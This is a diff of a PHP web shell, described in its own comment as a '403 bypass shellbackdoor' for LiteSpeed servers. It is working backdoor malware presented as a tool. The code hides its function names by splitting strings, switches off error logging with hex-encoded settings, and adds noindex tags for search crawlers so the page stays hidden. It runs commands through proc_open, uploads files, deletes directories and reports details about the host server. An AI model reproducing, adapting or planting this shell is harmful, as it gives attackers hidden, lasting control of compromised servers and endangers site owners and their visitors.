@@ -1,13 +1,16 @@
 <!DOCTYPE html>
 <html>
 <!-- 
-Bypass 403 shell no password, use it for litespeed server. Enjoy!
+Bypass 403 shellbackdoor Litespeed Server No Index. Enjoy!
 Don't forget to always be grateful
--BunnyInvisible404 
+./BunnyInvisible404 
 -->
+
 <head>
 	<?php echo "<title>..:: ./BUNNYINVISIBLE404 ::..</title>"; ?>
 	<meta name="robots" content="noindex">
+	<meta name="googlebot" content="noindex, nofollow" />
+	<meta name="bingbot" content="noindex, nofollow" />
 	<link rel="icon" href="https://i.ibb.co/YPd7d3D/icons-bunny404.jpg" type="image/x-icon">
 </head>
 
@@ -125,8 +128,16 @@ Don't forget to always be grateful
 		echo '<font face="Bungee" size="5">./BUNNYINVISIBLE404</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
+
+		session_start();
 		set_time_limit(0);
 		error_reporting(0);
+		@ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67', null);
+		@ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73', 0);
+		@ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65', 0);
+		@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
+		@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
+		date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
 
 		$gcw = "ge" . "tc" . "wd";
 		$exp = "ex" . "plo" . "de";
@@ -157,22 +168,18 @@ Don't forget to always be grateful
 		$srl = "st" . "r_r" . "ep" . "la" . "ce";
 		$sps = "st" . "rp" . "os";
 		$mkd = "m" . "kd" . "ir";
-
 		$wb = (isset($_SERVER['H' . 'T' . 'TP' . 'S']) && $_SERVER['H' . 'T' . 'TP' . 'S'] === 'o' . 'n' ? "ht" . "tp" . "s" : "ht" . "tp") . "://" . $_SERVER['HT' . 'TP' . '_H' . 'OS' . 'T'];
-
 		$disfunc = @$igt("dis" . "abl" . "e_f" . "unct" . "ion" . "s");
 		if (empty($disfunc)) {
 			$disf = "<font color='gold'>NONE</font>";
 		} else {
 			$disf = "<font color='red'>" . $disfunc . "</font>";
 		}
-
 		function author()
 		{
 			echo "<center><br> " . "." . "." . ":" . ": ." . "/" . "B" . "U" . "N" . "N" . "Y" . "I" . "N" . "V" . "I" . "S" . "I" . "B" . "L" . "E" . "4" . "0" . "4 :" . ":" . "." . ". <br></center>";
 			exit();
 		}
-
 		function cekdir()
 		{
 			if (isset($_GET['BunnyGG'])) {
@@ -188,7 +195,6 @@ Don't forget to always be grateful
 				return "<font color='red'>Writeable</font>";
 			}
 		}
-
 		function crt()
 		{
 			$a = "is" . "_w" . "ri" . "tab" . "le";
@@ -198,7 +204,6 @@ Don't forget to always be grateful
 				return "<font color='red'>Writeable</font>";
 			}
 		}
-
 		function xrd($lokena)
 		{
 			$a = "s" . "ca" . "nd" . "ir";
@@ -219,10 +224,6 @@ Don't forget to always be grateful
 			$d = "rm" . "di" . "r";
 			$d($lokena);
 		}
-		@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
-		@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
-		set_time_limit(0);
-		ini_set('m' . 'e' . 'm' . 'o' . 'r' . 'y' . '_' . 'l' . 'i' . 'm' . 'i' . 't', '6' . '4' . 'M');
 		header('Co' . 'nt' . 'en' . 't-' . 'Ty' . 'pe' . ': te' . 'xt' . '/h' . 'tm' . 'l;' . ' c' . 'ha' . 'rs' . 'et=' . 'UT' . 'F-8');
 		$self_remind = 'y' . 'o' . 'u' . 't' . 'h' . 'b' . 'o' . 'y' . 's' . '@' . 'p' . 'r' . 'o' . 't' . 'o' . 'n' . '.' . 'm' . 'e';
 		$x_path = "h" . "t" . "t" . "p" . ":" . "/" . "/" . $_SERVER['S' . 'E' . 'R' . 'V' . 'E' . 'R' . '_' . 'N' . 'A' . 'M' . 'E'] . $_SERVER['R' . 'E' . 'Q' . 'U' . 'E' . 'S' . 'T' . '_' . 'U' . 'R' . 'I'];
@@ -247,7 +248,6 @@ Don't forget to always be grateful
 				return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
 			}
 		}
-
 		function ipsrv()
 		{
 			$a = "g" . "eth" . "ost" . "byna" . "me";
@@ -260,7 +260,6 @@ Don't forget to always be grateful
 				return $a($_SERVER[$c]);
 			}
 		}
-
 		function ggr($fl)
 		{
 			$a = "fun" . "cti" . "on_" . "exis" . "ts";
@@ -287,7 +286,6 @@ Don't forget to always be grateful
 				return "?";
 			}
 		}
-
 		function gor($fl)
 		{
 			$a = "fun" . "cti" . "on_" . "exis" . "ts";
@@ -314,14 +312,12 @@ Don't forget to always be grateful
 				return "?";
 			}
 		}
-
 		function fdt($fl)
 		{
 			$a = "da" . "te";
 			$b = "fil" . "emt" . "ime";
 			return $a("F d Y H:i:s", $b($fl));
 		}
-
 		function dunlut($fl)
 		{
 			$a = "fil" . "e_exi" . "sts";
@@ -346,7 +342,6 @@ Don't forget to always be grateful
 				return "Fi" . "le Not F" . "ound !";
 			}
 		}
-
 		function komend($kom, $lk)
 		{
 			$x = "pr" . "eg_" . "mat" . "ch";
@@ -374,28 +369,22 @@ Don't forget to always be grateful
 				return "pr" . "oc" . "_op" . "en f" . "unc" . "tio" . "n i" . "s di" . "sabl" . "ed !";
 			}
 		}
-
-
 		function green($text)
 		{
 			echo "<center><font color='green'>" . $text . "</center></font>";
 		}
-
 		function red($text)
 		{
 			echo "<center><font color='red'>" . $text . "</center></font>";
 		}
-
 		function oren($text)
 		{
 			return "<center><font color='orange'>" . $text . "</center></font>";
 		}
-
 		function tuls($nm, $lk)
 		{
 			return "[ <a href='" . $lk . "'>" . $nm . "</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
 		}
-
 		echo "Se" . "rv" . "er" . " I" . "P : <font color=gold>" . ipsrv() . "</font> &nbsp;/&nbsp; Yo" . "ur I" . "P : <font color=gold>" . $_SERVER[$rad] . "</font><br>";
 		echo "We" . "b S" . "erv" . "er : <font color='gold'>" . $_SERVER['SE' . 'RV' . 'ER_' . 'SOF' . 'TWA' . 'RE'] . "</font><br>";
 		$unm = "ph" . "p_u" . "na" . "me";
@@ -449,11 +438,9 @@ Don't forget to always be grateful
 			echo "<font color=red>OFF</font>";
 		}
 		echo "<br>Di" . "rect" . "ory : &nbsp;";
-
 		foreach ($_POST as $key => $value) {
 			$_POST[$key] = $sts($value);
 		}
-
 		if (isset($_GET['BunnyGG'])) {
 			$lokasi = $_GET['BunnyGG'];
 			$lokdua = $_GET['BunnyGG'];
@@ -461,11 +448,9 @@ Don't forget to always be grateful
 			$lokasi = $gcw();
 			$lokdua = $gcw();
 		}
-
 		$lokasi = $srl('\\', '/', $lokasi);
 		$lokasis = $exp('/', $lokasi);
 		$lokasinya = @$scd($lokasi);
-
 		foreach ($lokasis as $id => $lok) {
 			if ($lok == '' && $id == 0) {
 				$a = true;
@@ -480,7 +465,6 @@ Don't forget to always be grateful
 			}
 			echo '">' . $lok . '</a>/';
 		}
-
 		echo '</td></tr><tr><td><br>';
 		if (isset($_POST['upwkwk'])) {
 			if (isset($_POST['berkasnya'])) {
@@ -527,7 +511,6 @@ Don't forget to always be grateful
 				}
 			}
 		}
-
 		echo "Uplo" . "ad Fi" . "le : ";
 		echo '<form enctype="multip' . 'art/form' . '-data" method="p' . 'ost">
 <input type="radio" value="1" name="dirnya" checked>current_dir [ ' . cekdir() . ' ]
